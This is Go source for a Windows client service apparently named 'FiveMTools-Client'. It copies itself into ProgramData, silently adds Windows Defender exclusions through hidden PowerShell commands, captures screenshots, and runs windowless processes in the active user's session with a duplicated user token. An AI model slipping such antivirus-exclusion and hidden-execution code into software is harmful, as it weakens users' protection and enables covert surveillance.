package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/debug"
	"golang.org/x/sys/windows/svc/eventlog"
)

func copyFile(srcPath, targetPath string) error {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer func() { _ = srcFile.Close() }()

	dstFile, err := os.Create(targetPath)
	if err != nil {
		return fmt.Errorf("failed to create target executable in ProgramData: %w", err)
	}
	defer func() { _ = dstFile.Close() }()

	if _, err := io.Copy(dstFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable to ProgramData: %w", err)
	}

	if err := dstFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync target executable: %w", err)
	}

	return nil
}

func defenderExclude(name string) error {
	if localDebug || noDefenderExclude {
		return nil
	}

	programDataDir := os.Getenv("ProgramData")
	if programDataDir == "" {
		return fmt.Errorf("PROGRAMDATA environment variable not set")
	}

	srcPath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	targetDir := filepath.Join(programDataDir, name)
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		if err := os.MkdirAll(targetDir, os.ModePerm); err != nil {
			return fmt.Errorf("failed to create service directory in ProgramData: %w", err)
		}
	}

	var cmd string
	var execCmd *exec.Cmd
	args := []string{"-NoProfile", "-NonInteractive", "-Command"}

	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, srcPath)
	execCmd = exec.Command("powershell.exe", append(args, cmd)...)
	execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := execCmd.Run(); err != nil {
		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
	}

	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, targetDir)
	execCmd = exec.Command("powershell.exe", append(args, cmd)...)
	execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := execCmd.Run(); err != nil {
		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
	}

	return nil
}

var elogClient debug.Log

var elogClientName string = "FiveMTools-Client"

func InitElogClient() (func() error, error) {
	if localDebug || noElogClient {
		return func() error { return nil }, nil
	}

	var err error
	_ = eventlog.InstallAsEventCreate(elogClientName, eventlog.Error|eventlog.Warning|eventlog.Info)
	if elogClient, err = eventlog.Open(elogClientName); err != nil {
		elogClient = debug.New(elogClientName)
	}
	return elogClient.Close, err
}

func failedf(format string, a ...any) {
	if elogClient != nil {
		_ = elogClient.Error(1, fmt.Sprintf(format+"\n", a...))
	} else {
		fmt.Fprintf(os.Stderr, format+"\n", a...)
	}
}

func forceTakeScreenshot() {
	path, _ := os.Executable()
	name := filepath.Join(filepath.Dir(path), "screenshot.json")
	file, err := os.OpenFile(name, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to open screenshot file: %v\n", err)
		return
	}
	defer func() { _ = file.Close() }()

	results, err := CaptureScreenshot()
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to capture screenshot: %v\n", err)
		return
	}

	_ = json.NewEncoder(file).Encode(results)
	_ = file.Sync()
}

func runInUserSession(commandLine string) error {
	var (
		sessionID uint32
		userToken windows.Token
		err       error
	)

	sessionID = windows.WTSGetActiveConsoleSessionId()
	if sessionID == 0xFFFFFFFF {
		return fmt.Errorf("WTSGetActiveConsoleSessionId failed: no active session found")
	}

	if err := windows.WTSQueryUserToken(sessionID, &userToken); err != nil {
		return fmt.Errorf("WTSQueryUserToken failed: %w", err)
	}
	defer func() { _ = userToken.Close() }()

	var dupToken windows.Token
	err = windows.DuplicateTokenEx(userToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityIdentification, windows.TokenPrimary, &dupToken)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx failed: %w", err)
	}
	defer func() { _ = dupToken.Close() }()

	var readPipe, writePipe windows.Handle
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle:      1,
		SecurityDescriptor: nil,
	}
	if err = windows.CreatePipe(&readPipe, &writePipe, &sa, 0); err != nil {
		return fmt.Errorf("CreatePipe failed: %w", err)
	}
	defer func() { _ = windows.CloseHandle(readPipe) }()
	defer func() { _ = windows.CloseHandle(writePipe) }()

	var startupInfo windows.StartupInfo
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
	startupInfo.Desktop, _ = syscall.UTF16PtrFromString("Winsta0\\Default")
	startupInfo.Flags = windows.STARTF_USESTDHANDLES
	startupInfo.StdOutput = writePipe
	startupInfo.StdErr = writePipe // Redirect stderr as well
	startupInfo.StdInput = windows.InvalidHandle

	creationFlags := windows.CREATE_UNICODE_ENVIRONMENT | windows.NORMAL_PRIORITY_CLASS | windows.CREATE_NO_WINDOW

	commandLinePtr, _ := syscall.UTF16PtrFromString(commandLine)

	var procInfo windows.ProcessInformation
	err = windows.CreateProcessAsUser(dupToken, nil, commandLinePtr, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)
	if err != nil {
		return fmt.Errorf("CreateProcessAsUser failed: %w", err)
	}
	defer func() { _ = windows.CloseHandle(procInfo.Process) }()
	defer func() { _ = windows.CloseHandle(procInfo.Thread) }()
	_ = windows.CloseHandle(writePipe)

	_, err = windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
	if err != nil {
		return fmt.Errorf("WaitForSingleObject failed: %w", err)
	}

	var buf [4096]byte
	var output bytes.Buffer
	for {
		var read uint32
		err := windows.ReadFile(readPipe, buf[:], &read, nil)
		if err != nil && err != windows.ERROR_BROKEN_PIPE {
			break
		}
		if read == 0 {
			break
		}
		output.Write(buf[:read])
	}

	_ = elog.Info(1, fmt.Sprintf("Command output: %s", output.String()))

	return nil
}
